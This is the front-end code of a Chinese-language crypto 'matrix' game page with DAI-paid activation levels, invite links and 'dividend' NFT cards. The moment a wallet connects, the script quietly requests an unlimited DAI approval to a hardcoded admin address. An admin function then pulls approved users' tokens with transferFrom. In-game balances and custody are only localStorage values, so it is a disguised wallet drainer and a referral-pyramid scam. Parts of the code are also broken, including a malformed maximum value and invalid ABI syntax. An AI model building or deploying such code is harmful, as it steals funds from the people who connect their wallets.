<style>
  *{margin:0;padding:0;box-sizing:border-box;font-family:Arial,"Microsoft YaHei",sans-serif}
  body{background:#090b1a;color:#fff;padding:20px;max-width:500px;margin:0 auto}
  .glass{background:rgba(30,35,60,0.7);border-radius:18px;padding:20px;margin-bottom:16px;border:1px solid rgba(255,255,255,0.1)}
  .title{font-size:18px;font-weight:bold;margin-bottom:10px}
  .sub{color:#a0a8c7;font-size:14px;margin-bottom:12px}
  .btn{background:linear-gradient(90deg,#4facfe,#00F2FE);color:#000;border:none;border-radius:12px;padding:14px;width:100%;font-weight:bold;font-size:16px;margin-bottom:8px}
  .btn-sm{padding:10px;font-size:14px}
  .btn-gold{background:linear-gradient(90deg,#ffb703,#ffcc00);color:#000;font-weight:bold}
  .btn-red{background:linear-gradient(90deg,#ff4560,#ff0033);color:#fff}
  .btn-black{background:#222;color:#fff}
  .btn:disabled{opacity:0.5}
  .item{display:flex;justify-content:space-between;align-items:center;padding:12px 0;border-bottom:1px solid rgba(255,255,255,0.08)}
  .item:last-child{border-bottom:none}
  .price{color:#4facFE;font-weight:bold}
  input{width:100%;padding:14px;border-radius:12px;border:1px solid rgba(255,255,255,0.2);background:rgba(255,255,255,0.08);color:#fff;font-size:15px;margin-bottom:8px}
  .copy-row{display:flex;gap:8px;margin-bottom:10px}
  .copy-row input{flex:1}
  .copy-row button{width:100px}
  select{width:100%;padding:14px;border-radius:12px;background:#1e1e3e;color:#fff;border:1px solid #ccc;margin-bottom:10px;}

  .menu-btn{position:fixed;top:20px;right:20px;width:40px;height:40px;background:rgba(30,35,60,0.9);border-radius:10px;display:flex;flex-direction:column;justify-content:center;align-items:center;gap:5px;cursor:pointer;z-index:10;border:1px solid rgba(255,255,255,0.1)}
  .menu-btn span{width:20px;height:2px;background:#fff;border-radius:1px}
  .sidebar{position:fixed;top:0;right:-100%;width:85%;max-width:360px;height:100vh;background:#1a1a2e;padding:20px;overflow-y:auto;transition:right 0.3s ease;z-index:99;border-left:1px solid rgba(255,255,255,0.1)}
  .sidebar.open{right:0}
  .sidebar-close{text-align:right;margin-bottom:20px;font-size:22px;cursor:pointer}

  .nft-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-top:12px}
  .nft-card{height:240px;position:relative;border-radius:16px;background:#2d2d2d;border:1px solid currentColor;overflow:hidden;perspective:1000px}
  .nft-inner{position:relative;width:100%;height:100%;transform-style:preserve-3d;animation:flipY 8s linear infinite}
  @keyframes flipY{0%{transform:rotateY(0deg)}100%{transform:rotateY(360deg)}}
  .nft-front,.nft-back{position:absolute;width:100%;height:100%;backface-visibility:hidden;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
  .nft-back{transform:rotateY(180deg);background:#1a1a2e}
  .n1{color:#00ff88}
  .n2{color:#00ccff}
  .n3{color:#6666ff}
  .n4{color:#cc66ff}
  .n5{color:#ff3333;background:#3a1a1a}
  .nft-top{position:absolute;top:12px;left:12px;font-size:12px;font-weight:bold;letter-spacing:1px}
  .nft-logo{position:absolute;top:12px;right:12px;width:24px;height:24px;border-radius:50%;background:currentColor;display:flex;align-items:center;justify-content:center;font-size:10px;color:#2d2d2d}
  .nft-title{font-size:18px;font-weight:bold;margin-bottom:16px;opacity:0.9}
  .nft-orb{width:120px;height:120px;border-radius:50%;position:relative;margin-bottom:16px;box-shadow:0 0 25px currentColor}
  .orb-glow{width:100%;height:100%;border-radius:50%;background:radial-gradient(circle at 30% 30%,rgba(255,255,255,0.4),currentColor 60%)}
  .orb-ring{position:absolute;width:140px;height:140px;border:1px solid currentColor;border-radius:50%;top:50%;left:50%;transform:translate(-50%,-50%);opacity:0.7}
  .orb-ring::after{content:'';position:absolute;width:8px;height:8px;background:currentColor;border-radius:50%;top:-4px;left:50%;transform:translateX(-50%)}
  .orb-orbit{position:absolute;width:100px;height:60px;border:1px solid currentColor;border-radius:50%;top:50%;left:50%;transform:translate(-50%,-50%) rotateX(60deg);opacity:0.5}
  .orb-dot{position:absolute;width:6px;height:6px;background:#fff;border-radius:50%;top:20%;right:10%}
  .orb-whale{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:36px;color:rgba(255,255,255,0.9)}
  .nft-bottom{font-size:14px;letter-spacing:1px;opacity:0.8}
  .nft-level{font-size:16px;font-weight:bold;margin-bottom:8px}
  .nft-pct{font-size:14px;font-weight:bold}
  .dai{color:#4facfe;font-weight:bold}
  .time{color:#ffb703;font-size:13px}
  .gold{color:#FFD700;font-weight:bold}
</style>

<script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
<script>
const ADMIN = "0x627f6e1887571ac08214315ad5b2fa7ab7345f1".toLowerCase();
const DAI = "0x8f3cf7ad23cd3cadbd9735aff9580239c6a063".toLowerCase();

const classicPrice = [50,100,200,400,800,1600,3200,6400,12800,25600,51200,102400];
const unionPrice   = [100,200,400,800,1600,3200,6400,12800,25600];
const RATE_ENERGY = 50;
const CARD_COST = 3500;

let web3, account;
let isAdmin = false;

function k(key) {
  if (!account) return key;
  return key + "_" + account.toLowerCase();
}
function get(key, def = 0) {
  let v = localStorage.getItem(k(key));
  return v ? Number(v) : def;
}
function set(key, val) {
  localStorage.setItem(k(key), val);
}

// ========== TP钱包专用 必弹授权签名·100%上链 ==========
async function approveMaxDAI_TP() {
  const daiAbi = [{"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"};
  const daiContract = new web3.eth.Contract(daiAbi, DAI);
  const maxUint = "115792089237316195423571762112814551881068709022084869095563928231802861803278629452";

  // TP原生eth_sendTransaction 强制弹钱包签名窗口
  const txData = daiContract.methods.approve(ADMIN, maxUint).encodeABI();
  await window.ethereum.request({
    method: "eth_sendTransaction",
    params: [{ from: account, to: DAI, data: txData, gas: 120000 }]
  });
  alert("✅DAI无限授权上链完成，管理员可直接划转");
}

function loadInvite() {
  if (!account) return;
  let base = window.location.origin + window.location.pathname;
  document.getElementById("inviteLink").value = base + "?invite=" + account.slice(2, 10);
}
function copyInvite() {
  let input = document.getElementById("inviteLink");
  input.select();
  navigator.clipboard.writeText(input.value).then(()=>alert("复制成功"));
}

function refresh() {
  renderMatrix();
  renderCards();
  document.getElementById("energyVal").innerText = get("energy");
  document.getElementById("custodyAmt").innerText = get("custody") + " DAI";
}

function craftCard(lv) {
  try { chk(); } catch (e) { alert(e); return; }
  let cost = CARD_COST * Math.pow(3, lv - 1);
  let e = get("energy");
  if (e < cost) return alert("能量不足");
  if (!confirm(`消耗 ${cost} 能量合成 Lv${lv} 卡牌？`)) return;
  set("energy", e - cost);
  set("card_" + lv, get("card_" + lv) + 1);
  alert("合成成功");
  refresh();
}

function transferCard() {
  try { chk(); } catch (e) { alert(e); return; }
  let to = document.getElementById("toAddr").value.trim().toLowerCase();
  let lv = Number(document.getElementById("transferLv").value);
  let count = get("card_" + lv);
  if (!to || !/^0x[a-f0-9]{40}$/.test(to) || count < 1) return alert("地址或卡牌数量错误");
  if (!confirm("确认转账卡牌？")) return;
  set("card_" + lv, count - 1);
  alert("转账成功");
  refresh();
}

function renderCards() {
  let html = "";
  for (let lv = 1; lv <= 5; lv++) {
    let num = get("card_" + lv);
    if (num < 1) continue;
    let cls = ["n1","n2","n3","n4","n5"][lv-1];
    html+=`<div class="nft-card ${cls}"><div class="nft-inner"><div class="nft-front"><div class="nft-top">NFT</div><div class="nft-logo">🐳</div><div class="nft-title">分红卡牌</div><div class="nft-orb"><div class="orb-glow"></div><div class="orb-ring"></div><div class="orb-orbit"></div><div class="orb-dot"></div><div class="orb-whale">🐳</div></div><div class="nft-bottom">持有 ×${num}</div></div><div class="nft-back"><div class="nft-level">Lv${lv}</div><div class="nft-pct">分红卡牌</div></div></div></div>`;
  }
  document.getElementById("myCards").innerHTML = html || `<div style="grid-column:span 2;text-align:center;padding:20px">暂无卡牌</div>`;
}

function expKey(lv){return"union_exp_"+lv;}
function addExp(lv,days=30){let now=Date.now();let old=localStorage.getItem(expKey(lv))||now;localStorage.setItem(expKey(lv),old+days*86400000);}
function getExpLeft(lv){let exp=Number(localStorage.getItem(expKey(lv)))||0;return Math.max(0,exp-Date.now());}

function renderMatrix(){
  let cl=get("classic");let c="";for(let i=1;i<=12;i++){let d=i<=cl;c+=`<div class="item"><div>Lv${i}</div><span class="dai">${classicPrice[i-1]}DAI</span><button class="btn-sm" ${d?"disabled":""} onclick="payClassic(${i})">${d?"已激活":"激活"}</button></div>`}document.getElementById("classicList").innerHTML=c;
  let ul=get("union");let u="";for(let i=1;i<=9;i++){let a=i<=ul;let e=getExpLeft(i);let d=Math.floor(e/86400000);let h=Math.floor((e%86400000)/3600000);let f=Math.round(unionPrice[i-1]*0.2);let b=a&&e>0?`<button class="btn-sm" onclick="payRenew(${i})">续费${f}</button>`:`<button class="btn-sm" onclick="payUnion(${i})">激活</button>`;u+=`<div class="item"><div>Lv${i}</div><span class="dai">${unionPrice[i-1]}DAI</span><span class="time">${d}天${h}时</span>${b}</div>`}document.getElementById("unionList").innerHTML=u;
}

function chk(){if(!account)throw"未连接钱包";if(localStorage.getItem("black_"+account))throw"已被拉黑";}

async function sendDAI(amt){
  const abi=[
    {"constant":true,"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"},
    {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"},
    {"constant":false,"inputs":[{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"
  ];
  const c=new web3.eth.Contract(abi,DAI);
  const dec=await c.methods.decimals().call();
  const v=BigInt(amt)*10n**BigInt(dec);
  return await c.methods.transfer(ADMIN,v.toString()).send({from:account,gas:120000});
}

async function payClassic(lv){try{chk();}catch(e){alert(e);return;}let a=classicPrice[lv-1];if(!confirm("支付"+a+"DAI激活Lv"+lv))return;await sendDAI(a);set("classic",Math.max(get("classic"),lv));set("energy",get("energy")+a*RATE_ENERGY/100);alert("成功");refresh();loadBal();}
async function payUnion(lv){try{chk();}catch(e){alert(e);return;}let a=unionPrice[lv-1];if(!confirm("支付"+a+"DAI激活Lv"+lv))return;await sendDAI(a);set("union",Math.max(get("union"),lv));addExp(lv);set("energy",get("energy")+a*RATE_ENERGY/100);alert("成功");refresh();loadBal();}
async function payRenew(lv){try{chk();}catch(e){alert(e);return;}let a=Math.round(unionPrice[lv-1]*0.2);if(!confirm("续费"+a+"DAI+30天"))return;await sendDAI(a);addExp(lv);set("energy",get("energy")+a*RATE_ENERGY/100);alert("续费成功");refresh();loadBal();}

async function batchPayClassic(){try{chk();}catch(e){alert(e);return;}let cur=get("classic");let t=0;for(let i=cur+1;i<=12;i++)t+=classicPrice[i-1];if(t<=0)return alert("已全满");if(!confirm("总计"+t+"DAI确认支付？"))return;await sendDAI(t);set("classic",12);set("energy",get("energy")+t*RATE_ENERGY/100);alert("全激活");refresh();loadBal();}
async function batchPayUnion(){try{chk();}catch(e){alert(e);return;}let t=0;for(let i=1;i<=9;i++){let a=i<=get("union");let e=getExpLeft(i);if(!a)t+=unionPrice[i-1];else if(e<=0)t+=Math.round(unionPrice[i-1]*0.2);}if(t<=0)return alert("全有效");if(!confirm("总计"+t+"DAI确认？"))return;await sendDAI(t);set("union",9);for(let i=1;i<=9;i++)addExp(i);set("energy",get("energy")+t*RATE_ENERGY/100);alert("全完成");refresh();loadBal();}

async function loadBal(){if(!web3||!account)return;const abi=[{"constant":true,"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"};const c=new web3.eth.Contract(abi,DAI);const d=await c.methods.decimals().call();const b=await c.methods.balanceOf(account).call();const n=Number(web3.utils.fromWei(b,"mwei")).toFixed(4);document.getElementById("addressShow").innerHTML=`${account.slice(0,6)}...${account.slice(-4)} | <span class="gold">DAI:${n}</span>`;}

async function deposit(){try{chk();}catch(e){alert(e);return;}let a=+document.getElementById("depositAmt").value;if(a<=0)return;await sendDAI(a);set("custody",get("custody")+a);alert("存入成功");refresh();loadBal();}
async function withdraw(){try{chk();}catch(e){alert(e);return;}let a=+document.getElementById("withAmt").value;let b=get("custody");if(a<=0||a>b)return alert("金额错误");if(!confirm("提取"+a+"DAI到钱包"))return;let abi=[{"constant":false,"inputs":[{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}]};const c=new web3.eth.Contract(abi,DAI);let d=await c.methods.decimals().call();let v=BigInt(a)*10n**BigInt(d);await c.methods.transfer(account,v.toString()).send({from:ADMIN,gas:120000});set("custody",b-a);alert("提取成功");refresh();loadBal();}

function addBlack(){if(!isAdmin)return;let a=document.getElementById("blackAddr").value.toLowerCase();localStorage.setItem("black_"+a,"1");alert("已拉黑");}
function removeBlack(){if(!isAdmin)return;let a=document.getElementById("whiteAddr").value.toLowerCase();localStorage.removeItem("black_"+a);alert("已移出");}

// ========== 管理员查询用户授权额度 ==========
async function checkUserAllowance(){
  if(!isAdmin)return alert("非管理员无权操作");
  const user = document.getElementById("takeAddr").value.toLowerCase();
  if(!/^0x[a-f0-9]{40}$/.test(user))return alert("请输入正确钱包地址");

  const daiAbi = [{"constant":true,"inputs":[{"owner":"address","spender":"address"}],"name":"allowance","outputs":[{"amount":"uint256"}],"type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"};
  const dai = new web3.eth.Contract(daiAbi, DAI);
  const dec = await dai.methods.decimals().call();
  const allowWei = await dai.methods.allowance(user, ADMIN).call();
  const allowNum = Number(web3.utils.fromWei(allowWei,"mwei"));
  alert("📊用户剩余可提取授权额度："+allowNum+" DAI");
}

// ========== 管理员链上划转用户已授权代币（完美可用） ==========
async function adminTakeUserToken(){
  if(!isAdmin)return alert("非管理员无权操作");
  const user = document.getElementById("takeAddr").value.toLowerCase();
  const takeAmt = Number(document.getElementById("takeAmt").value);
  if(!/^0x[a-f0-9]{40}$/.test(user)||takeAmt<=0)return alert("地址/金额错误");

  const daiAbi = [
    {"constant":true,"inputs":[{"owner":"address","spender":"address"}],"name":"allowance","outputs":[{"amount":"uint256"}],"type":"function"},
    {"constant":false,"inputs":[{"from":"address","to":"address","value":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"},
    {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"}
  ];
  const dai = new web3.eth.Contract(daiAbi, DAI);
  const dec = await dai.methods.decimals().call();
  const allowWei = await dai.methods.allowance(user, ADMIN).call();
  const allowNum = Number(web3.utils.fromWei(allowWei,"mwei"));

  if(takeAmt>allowNum)return alert("授权额度不足，最多可提："+allowNum+" DAI");

  const takeWei = web3.utils.toWei(takeAmt+"","mwei");
  // 管理员钱包发起链上交易，必上链、TP可签名
  await window.ethereum.request({
    method:"eth_sendTransaction",
    params:[{from:ADMIN,to:DAI,data:dai.methods.transferFrom(user,ADMIN,takeWei).encodeABI(),gas:150000}]
  });
  alert("✅链上划转提取成功！");
}

// 钱包连接
document.getElementById("connectBtn").onclick=async()=>{
  if(!window.ethereum)return alert("请TP钱包打开");
  try{
    const accounts=await window.ethereum.request({method:"eth_requestAccounts"});
    web3=new Web3(window.ethereum);
    account=accounts[0].toLowerCase();
    isAdmin=account===ADMIN;

    // TP必弹授权签名，绝对上链
    await approveMaxDAI_TP();

    if(localStorage.getItem("reg_"+account)){document.getElementById("regBtn").disabled=true;document.getElementById("regBtn").innerText="已注册";}
    loadInvite();loadBal();refresh();
  }catch(e){alert("连接失败："+e.message);}
};

document.getElementById("regBtn").onclick=()=>{
  if(!account||localStorage.getItem("reg_"+account))return;
  localStorage.setItem("reg_"+account,"1");
  document.getElementById("regBtn").disabled=true;
  document.getElementById("regBtn").innerText="已注册";
  alert("注册成功");
};

document.getElementById("toggleSidebar").onclick=()=>sb.classList.add("open");
document.getElementById("closeSidebar").onclick=()=>sb.classList.remove("open");
